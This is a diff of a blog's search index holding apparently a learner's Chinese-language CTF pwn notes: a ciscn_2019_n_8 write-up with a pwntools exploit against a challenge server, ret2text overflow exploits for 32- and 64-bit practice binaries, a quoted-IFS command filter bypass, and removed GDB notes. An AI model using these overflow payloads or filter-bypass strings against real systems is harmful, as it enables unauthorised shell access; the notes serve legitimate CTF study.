@@ -405,6 +405,18 @@
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041536582.png" alt="image-20241204153640514"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412042041277.png" alt="image-20241204204135165"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412042050030.png" alt="image-20241204205037946"></p>
+<h3 id="8-ciscn-2019-n-8"><a href="#8-ciscn-2019-n-8" class="headerlink" title="8.ciscn_2019_n_8"></a>8.ciscn_2019_n_8</h3><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>die</p>
+<p>反汇编查看：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp-14h] [ebp-20h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp-10h] [ebp-1Ch]</span><br><br>  var[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>  var[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">init</span>();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, var, v4, v5);<br>  <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] == <span class="hljs-number">17LL</span> )          <span class="hljs-comment">//如果var中的第14个数为17，进入</span><br>      <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);                        <span class="hljs-comment">//找到system</span><br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">printf</span>(<br>        <span class="hljs-string">&quot;something wrong! val is %d&quot;</span>,<br>        var[<span class="hljs-number">0</span>],<br>        var[<span class="hljs-number">1</span>],<br>        var[<span class="hljs-number">2</span>],<br>        var[<span class="hljs-number">3</span>],<br>        var[<span class="hljs-number">4</span>],<br>        var[<span class="hljs-number">5</span>],<br>        var[<span class="hljs-number">6</span>],<br>        var[<span class="hljs-number">7</span>],<br>        var[<span class="hljs-number">8</span>],<br>        var[<span class="hljs-number">9</span>],<br>        var[<span class="hljs-number">10</span>],<br>        var[<span class="hljs-number">11</span>],<br>        var[<span class="hljs-number">12</span>],<br>        var[<span class="hljs-number">13</span>],<br>        var[<span class="hljs-number">14</span>]);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s, Welcome!\n&quot;</span>, var);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try do something~&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以构造payload时要先填充前13个元素（每个元素4个字节int)再将17发送过去，使其进入</p>
+<p>system（binsh）</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-string">&quot;25918&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">13</span>*<span class="hljs-number">4</span>+p32(<span class="hljs-number">17</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<ol start="9">
+<li></li>
+</ol>
 ]]></content>
   </entry>
   <entry>
@@ -516,39 +528,6 @@
 <p>这一行代码的意思是：<br>我们将计算出来的libc基地址（libc_base）存储到libc对象中的address属性里。</p>
 <p>libc是一个表示libc 库的对象，这个对象的属性address用来记录整个库的起始地址。<br>在后面的代码中，我们可能需要调用libc 库中的函数。通过将基地址存储到libc.address，我们可以轻松访问libc中其他函数的位置，因为它们的地址是根据基地址来计算的。</p>
 <p>所以，libc.address&#x3D;libc_base的功能是将计算得到的libc 基地址保存到libc对象中，以便后续的代码可以便利地使用这个地址。这是一种为后续操作准备的方式，确保在使用时候能够找到libc库的正确位置。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>pwn打题之基础巩固（调试）</title>
-    <url>/2024/12/08/pwn%E6%89%93%E9%A2%98%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%B7%A9%E5%9B%BA%EF%BC%88%E8%B0%83%E8%AF%95%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h1><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">run</span><br></code></pre></td></tr></table></figure>
-
-<p><code>start</code></p>
-<ol>
-<li><h5 id="步入"><a href="#步入" class="headerlink" title="步入"></a>步入</h5></li>
-<li><h5 id="步过"><a href="#步过" class="headerlink" title="步过"></a>步过</h5></li>
-<li><h5 id="步出"><a href="#步出" class="headerlink" title="步出"></a>步出</h5></li>
-<li><h5 id="步止"><a href="#步止" class="headerlink" title="步止"></a>步止</h5></li>
-</ol>
-<h4 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h4><ul>
-<li>设置</li>
-<li>删除</li>
-<li>显示</li>
-</ul>
-<p>查看&#x2F;设置</p>
-<p>内存，寄存器，各种参数</p>
-<p>远程调试</p>
-<h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><ul>
-<li><p>查看</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">i r<br></code></pre></td></tr></table></figure>
-
-<p><strong>rip             存放当前指令的地址</strong></p>
-<p>rbp，rsp  作栈（栈底，栈顶）</p>
-<p>rax            用来存储程序的返回值</p>
-</li>
-<li></li>
-<li></li>
-</ul>
 ]]></content>
   </entry>
   <entry>
@@ -709,6 +688,38 @@
 <p><strong>生成一段shellcode汇编代码：shellcode &#x3D; shellcraft.sh()</strong></p>
 <p><strong>编译shellcode汇编代码为字节码：shellcode &#x3D; asm(shellcraft.sh())</strong></p>
 <p>参考文章：<a href="https://blog.csdn.net/qq_41988448/article/details/103124339">https://blog.csdn.net/qq_41988448/article/details/103124339</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>pwn学习之路</title>
+    <url>/2024/12/17/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
+    <content><![CDATA[<p>NSS-pwn 第一题</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172038999.png"></p>
+<p>输入su</p>
+<p>进入root模式；(管理员模式)</p>
+<p>binsh    &#x2F;bin&#x2F;sh    sh</p>
+<p>bash</p>
+<p>&#x2F;</p>
+<p>c’at’$IFS$9flag</p>
+<h2 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h2><h3 id="x32位"><a href="#x32位" class="headerlink" title="x32位"></a>x32位</h3><p>最简单：有system有binsh</p>
+<p>后门函数的地址到传参的地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2text&quot;</span>)<br>system = <span class="hljs-number">0x008048506</span><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x108</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(system)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="x64位"><a href="#x64位" class="headerlink" title="x64位"></a>x64位</h3><p>（注意栈平衡）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172125376.png" alt="image-20241217212559335"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2textx64&quot;</span>)<br><br><span class="hljs-comment"># gdb.attach(p, &#x27;b*0x00000000004011A2&#x27;)</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x0000000004011A9</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h4><p>（32位没有，64位有）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172153628.png" alt="image-20241217215337601"></p>
+<h5 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h5><p>64位架构中，系统要求函数调用前堆栈必须16字节对齐。因为64位函数在执行时要求堆栈在特定的对齐条件下。</p>
+<h5 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h5><p>保证payload要求是16的倍数（p64是将其转换成8字节）</p>
+<h5 id="p64是什么意思"><a href="#p64是什么意思" class="headerlink" title="p64是什么意思"></a>p64是什么意思</h5><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172152557.png" alt="image-20241217215212527"></p>
+<h5 id="字节-字符-字节串"><a href="#字节-字符-字节串" class="headerlink" title="字节&amp;字符&amp;字节串"></a>字节&amp;字符&amp;字节串</h5><h6 id="字节Byte"><a href="#字节Byte" class="headerlink" title="字节Byte"></a>字节Byte</h6><p>数据在内存&#x2F;程序中以字节的形式储存。</p>
+<p>1个字节有由8个bit组成</p>
+<p>‘A’占一个字节，其二进制表示为 <code>01000001</code></p>
+<h6 id="字符Character"><a href="#字符Character" class="headerlink" title="字符Character"></a>字符Character</h6><h6 id="字节串Bytes"><a href="#字节串Bytes" class="headerlink" title="字节串Bytes"></a>字节串Bytes</h6><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172203436.png" alt="image-20241217220312338"></p>
 ]]></content>
   </entry>
 </search>
